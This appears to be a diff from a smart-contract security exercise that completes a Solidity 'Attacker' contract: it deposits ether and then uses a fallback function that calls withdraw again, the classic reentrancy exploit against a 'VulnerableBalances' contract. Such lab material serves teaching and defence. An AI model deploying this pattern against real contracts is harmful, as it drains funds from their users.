@@ -16,12 +16,17 @@ contract Attacker {
 
     constructor(VulnerableBalances _vulnerable) public payable {
         vulnerable = _vulnerable;
+        vulnerable.deposit.value(msg.value)();
         // deposit initial balance
     }
 
     // implement fallback function that calls back vulnerable withdraw
+    function() public payable {
+        vulnerable.withdraw();
+    }  
 
     // call vulnerable.withdraw to start the exploit
     function start() public {
+        vulnerable.withdraw();
     }
 }
